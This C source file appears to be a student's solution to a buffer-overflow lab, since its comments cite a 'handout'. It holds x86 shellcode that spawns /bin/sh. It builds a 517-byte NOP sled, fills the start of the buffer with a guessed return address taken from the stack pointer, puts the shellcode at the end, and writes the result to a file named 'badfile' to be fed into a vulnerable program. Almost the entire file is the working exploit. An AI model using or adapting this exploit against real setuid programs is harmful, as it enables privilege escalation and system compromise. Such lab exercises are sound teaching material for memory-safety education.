#include <stdlib.h>
#include <stdio.h>
#include <string.h>

char shellcode[] = "\x31\xc0"
		   "\x50"
		   "\x68""//sh"
		   "\x68""/bin"
   		   "\x89\xe3"
		   "\x50"
		   "\x53"
		   "\x89\xe1"
		   "\x99"
		   "\xb0\x0b"
		   "\xcd\x80";

/*Get stack pointer func */
unsigned long get_sp(void){
		
	__asm__("movl %esp,%eax");
}
void main(int argc, char **argv){
	char buffer[517];
	FILE *badfile;
	memset(&buffer, 0x90, 517);
	/* My contents here contents here */

	/*Get stack pointer*/ 
	unsigned long addr = get_sp();
	long *ptr = (long*)buffer;
	int i = 0;
	/*Store the longs in buffer as shown in handout */
	while (i < 24)
	{
		*(ptr + i) = (addr + 300);
		i++;
	}
	memset(&buffer[517-strlen(shellcode)], 0, strlen(shellcode));
	i = 0;
	/* Add malicious code to the end of NOP buffer */
	while (i < strlen(shellcode))
	{
		memset(&buffer[517-strlen(shellcode)+i], shellcode[i],1);
		i++;
	}

	/*************************/
	badfile = fopen("./badfile", "w");
	fwrite(buffer, 517, 1, badfile);
	fclose(badfile);
}
